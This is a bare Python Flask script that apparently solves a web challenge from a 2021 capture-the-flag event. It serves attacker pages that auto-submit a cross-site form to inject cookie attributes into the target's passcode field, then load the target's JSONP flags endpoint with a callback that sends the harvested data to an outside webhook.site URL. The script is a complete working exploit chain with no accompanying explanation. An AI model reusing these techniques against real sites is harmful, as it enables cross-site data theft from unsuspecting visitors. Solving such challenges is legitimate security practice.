#!/usr/bin/env python3

from flask import Flask
import time

app = Flask(__name__)

@app.route('/delay')
def delay():
        time.sleep(9)
        return "zeu"

@app.route('/form')
def form():
        return """
<html>
<body>
<form method='post' id='hack' action='https://jason.2021.chall.actf.co/passcode'>
<input type='text' name='passcode' value=';SameSite=None; Secure'>
</form>
<script>
document.getElementById('hack').submit();
</script>
</body>
</html>
"""

@app.route('/flag')
def flag():
        return """
<html>
<meta name='referrer' content='no-referrer'> 
<body>
<script>
function load(data){
fetch("https://webhook.site/4936b7f9-93a9-4c62-9239-3125cccdc0f7?a="+data.items.map(i => i).join(''));
}
var s=document.createElement("script");
s.src="https://jason.2021.chall.actf.co/flags?callback=load";
document.body.appendChild(s);
</script>
</body>
</html>

"""

@app.route('/')
def index():
        return """
<html>
<body>
<img src="/delay"/>
<script>
var w=window.open("/form","win");
window.open("/flag","hah");
</script>
</body> 
</html>
"""
if __name__=="__main__":
        app.run(port=1234, host="0.0.0.0")